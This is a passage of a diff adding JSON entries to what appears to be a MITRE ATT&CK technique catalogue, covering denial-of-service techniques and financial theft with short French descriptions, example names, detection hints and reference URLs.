+        "url": "https://attack.mitre.org/techniques/T1499/",
+        "sub_techniques": [
+          {
+            "id": "T1499.002",
+            "name": "Service Exhaustion Flood",
+            "description": "Flood d'un service (HTTP/SYN).",
+            "platforms": [
+              "Windows",
+              "Linux",
+              "macOS",
+              "IaaS"
+            ],
+            "example": "Slowloris, HTTP GET flood.",
+            "detection": "IDS/IPS, rate limiting.",
+            "url": "https://attack.mitre.org/techniques/T1499/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1498",
+        "name": "Network Denial of Service",
+        "description": "DoS réseau (bandwidth, ressources).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "IaaS",
+          "Network"
+        ],
+        "example": "Mirai botnet DDoS.",
+        "detection": "Flow telemetry + ISP coordination.",
+        "url": "https://attack.mitre.org/techniques/T1498/",
+        "sub_techniques": [
+          {
+            "id": "T1498.001",
+            "name": "Direct Network Flood",
+            "description": "Flood direct (UDP/ICMP).",
+            "platforms": [
+              "Network",
+              "IaaS"
+            ],
+            "example": "UDP flood.",
+            "detection": "Flow data, NetFlow.",
+            "url": "https://attack.mitre.org/techniques/T1498/001/"
+          },
+          {
+            "id": "T1498.002",
+            "name": "Reflection Amplification",
+            "description": "Amplification (DNS, NTP).",
+            "platforms": [
+              "Network",
+              "IaaS"
+            ],
+            "example": "DNS amplification attack.",
+            "detection": "Flow anomalies, BCP38.",
+            "url": "https://attack.mitre.org/techniques/T1498/002/"
+          }
+        ]
+      },
+      {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "description": "Vol financier direct (fraude bancaire, crypto).",
+        "platforms": [
+          "Windows",
+          "Linux",
+          "macOS",
+          "SaaS",
+          "IaaS"
+        ],
+        "example": "Manipulation de transactions Swift.",
+        "detection": "Banking trojan detection, anomalie de transactions.",
+        "url": "https://attack.mitre.org/techniques/T1657/"
+      }
+    ]
+  }
+]
